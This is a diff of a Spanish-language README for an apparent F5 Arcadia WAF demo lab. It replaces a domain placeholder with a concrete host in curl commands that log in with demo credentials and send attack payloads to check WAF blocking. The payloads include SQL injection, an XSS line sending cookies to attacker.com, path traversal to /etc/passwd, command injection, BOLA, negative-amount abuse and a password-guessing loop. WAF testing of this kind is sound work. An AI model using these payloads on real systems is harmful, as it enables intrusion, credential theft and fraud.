@@ -321,7 +321,7 @@ flowchart LR
 
 ### Acceso inicial
 
-Navegar a `http://<ARCADIA_DOMAIN>/trading/login.php` en el navegador e iniciar sesión con las credenciales indicadas abajo.
+Navegar a `http://arcadia.digitalvs.com/trading/login.php` en el navegador e iniciar sesión con las credenciales indicadas abajo.
 
 > **Nota:** La aplicación tarda 2-3 minutos en estar disponible tras el deploy, ya que los containers Docker se inicializan vía `userdata.sh` al lanzar la instancia EC2.
 
@@ -337,7 +337,7 @@ Navegar a `http://<ARCADIA_DOMAIN>/trading/login.php` en el navegador e iniciar 
 
 ```bash
 # 1. Login y guardar cookie de sesión
-curl -s -X POST "http://<ARCADIA_DOMAIN>/trading/auth.php" \
+curl -s -X POST "http://arcadia.digitalvs.com/trading/auth.php" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "username=matt&password=ilovef5" \
   -c /tmp/arcadia_cookies.txt \
@@ -346,11 +346,11 @@ curl -s -X POST "http://<ARCADIA_DOMAIN>/trading/auth.php" \
 # Si devuelve location: login.php → credenciales incorrectas
 
 # 2. Verificar que la sesión funciona — portfolio del usuario
-curl -s "http://<ARCADIA_DOMAIN>/trading/rest/portfolio.php" \
+curl -s "http://arcadia.digitalvs.com/trading/rest/portfolio.php" \
   -b /tmp/arcadia_cookies.txt | python3 -m json.tool
 
 # 3. Consultar cuentas disponibles
-curl -s "http://<ARCADIA_DOMAIN>/api/side_bar_accounts.php" \
+curl -s "http://arcadia.digitalvs.com/api/side_bar_accounts.php" \
   -b /tmp/arcadia_cookies.txt | python3 -m json.tool
 ```
 
@@ -402,7 +402,7 @@ La UI de Arcadia llama a `/api/side_bar_table.php` para cargar la tabla de tarje
 ```bash
 # Confirmar bloqueo
 curl -s -b /tmp/arcadia_cookies.txt \
-  "http://<ARCADIA_DOMAIN>/api/side_bar_table.php" \
+  "http://arcadia.digitalvs.com/api/side_bar_table.php" \
   -w "\nHTTP: %{http_code}\n"
 # Resultado: HTTP: 403  →  Request Rejected (sp4-sao)
 ```
@@ -414,14 +414,14 @@ El swagger define `amount` y `account` como `type: integer`. El formulario HTML 
 ```bash
 # Con integers → 200 OK
 curl -s -b /tmp/arcadia_cookies.txt \
-  -X POST "http://<ARCADIA_DOMAIN>/api/rest/execute_money_transfer.php" \
+  -X POST "http://arcadia.digitalvs.com/api/rest/execute_money_transfer.php" \
   -H "Content-Type: application/json" \
   -d '{"amount":10,"account":2075894,"currency":"EUR","friend":"Vincent"}' \
   -w "\nHTTP: %{http_code}\n"
 
 # Con strings → 403 Bloqueado
 curl -s -b /tmp/arcadia_cookies.txt \
-  -X POST "http://<ARCADIA_DOMAIN>/api/rest/execute_money_transfer.php" \
+  -X POST "http://arcadia.digitalvs.com/api/rest/execute_money_transfer.php" \
   -H "Content-Type: application/json" \
   -d '{"amount":"10","account":"2075894","currency":"EUR","friend":"Vincent"}' \
   -w "\nHTTP: %{http_code}\n"
@@ -438,7 +438,7 @@ Con `XC_WAF_BLOCKING=true`, los ataques son bloqueados antes de llegar a la apli
 #### 1. SQLi en JSON body — WAF bloquea ✅
 
 ```bash
-curl -i -X POST "http://<ARCADIA_DOMAIN>/api/rest/execute_money_transfer.php" \
+curl -i -X POST "http://arcadia.digitalvs.com/api/rest/execute_money_transfer.php" \
   -H "Content-Type: application/json" \
   -d '{"amount":1000,"to":"anna'\'' OR '\''1'\''='\''1"}'
 ```
@@ -446,7 +446,7 @@ curl -i -X POST "http://<ARCADIA_DOMAIN>/api/rest/execute_money_transfer.php" \
 #### 2. SQLi en campo numérico (UNION based)
 
 ```bash
-curl -i -X POST "http://<ARCADIA_DOMAIN>/api/rest/execute_money_transfer.php" \
+curl -i -X POST "http://arcadia.digitalvs.com/api/rest/execute_money_transfer.php" \
   -H "Content-Type: application/json" \
   -d '{"amount":"1 UNION SELECT username,password FROM users--","to":"Bart"}'
 ```
@@ -454,7 +454,7 @@ curl -i -X POST "http://<ARCADIA_DOMAIN>/api/rest/execute_money_transfer.php" \
 #### 3. XSS en body JSON
 
 ```bash
-curl -i -X POST "http://<ARCADIA_DOMAIN>/api/rest/execute_money_transfer.php" \
+curl -i -X POST "http://arcadia.digitalvs.com/api/rest/execute_money_transfer.php" \
   -H "Content-Type: application/json" \
   -d '{"amount":100,"to":"<script>document.location='\''http://attacker.com?c='\''+document.cookie</script>"}'
 ```
@@ -462,37 +462,37 @@ curl -i -X POST "http://<ARCADIA_DOMAIN>/api/rest/execute_money_transfer.php" \
 #### 4. Path Traversal
 
 ```bash
-curl -i "http://<ARCADIA_DOMAIN>/../../../../etc/passwd"
-curl -i "http://<ARCADIA_DOMAIN>/api/lower_bar.php?file=../../../../etc/passwd"
+curl -i "http://arcadia.digitalvs.com/../../../../etc/passwd"
+curl -i "http://arcadia.digitalvs.com/api/lower_bar.php?file=../../../../etc/passwd"
 ```
 
 #### 5. Command Injection en parámetro GET
 
 ```bash
-curl -i "http://<ARCADIA_DOMAIN>/api/lower_bar.php?user=admin;id"
+curl -i "http://arcadia.digitalvs.com/api/lower_bar.php?user=admin;id"
 ```
 
 #### 6. Autenticación + ataques en endpoints de trading (requieren sesión)
 
 ```bash
 # 1. Autenticarse y guardar cookie de sesión
-curl -c /tmp/arc.txt -X POST "http://<ARCADIA_DOMAIN>/trading/auth.php" \
+curl -c /tmp/arc.txt -X POST "http://arcadia.digitalvs.com/trading/auth.php" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "username=matt&password=ilovef5" -L
 
 # 2. BOLA — manipular account ID ajeno
 curl -i -b /tmp/arc.txt \
-  "http://<ARCADIA_DOMAIN>/api/side_bar_accounts.php?account_id=1"
+  "http://arcadia.digitalvs.com/api/side_bar_accounts.php?account_id=1"
 
 # 3. SQLi en compra de stocks
 curl -i -b /tmp/arc.txt -X POST \
-  "http://<ARCADIA_DOMAIN>/trading/rest/buy_stocks.php" \
+  "http://arcadia.digitalvs.com/trading/rest/buy_stocks.php" \
   -H "Content-Type: application/json" \
   -d '{"trans_value":100,"stock_price":"198 OR 1=1--","qty":10,"company":"F5"}'
 
 # 4. Manipulación de lógica de negocio (monto negativo)
 curl -i -b /tmp/arc.txt -X POST \
-  "http://<ARCADIA_DOMAIN>/trading/rest/buy_stocks.php" \
+  "http://arcadia.digitalvs.com/trading/rest/buy_stocks.php" \
   -H "Content-Type: application/json" \
   -d '{"trans_value":-99999,"stock_price":198,"qty":1,"company":"F5"}'
 ```
@@ -505,7 +505,7 @@ for cred in "admin:admin" "admin:password" "matt:12345" "root:root" "guest:guest
   pass=$(echo $cred | cut -d: -f2)
   echo -n "$user:$pass → "
   curl -s -o /dev/null -w "%{http_code}\n" -X POST \
-    "http://<ARCADIA_DOMAIN>/trading/auth.php" \
+    "http://arcadia.digitalvs.com/trading/auth.php" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=$user&password=$pass" -L
 done
@@ -514,10 +514,10 @@ done
 #### 8. Scanner simulation (User-Agent malicioso)
 
 ```bash
-curl -i "http://<ARCADIA_DOMAIN>/" \
+curl -i "http://arcadia.digitalvs.com/" \
   -H "User-Agent: sqlmap/1.7.8#stable (https://sqlmap.org)"
 
-curl -i "http://<ARCADIA_DOMAIN>/" \
+curl -i "http://arcadia.digitalvs.com/" \
   -H "User-Agent: Nikto/2.1.6"
 ```
 
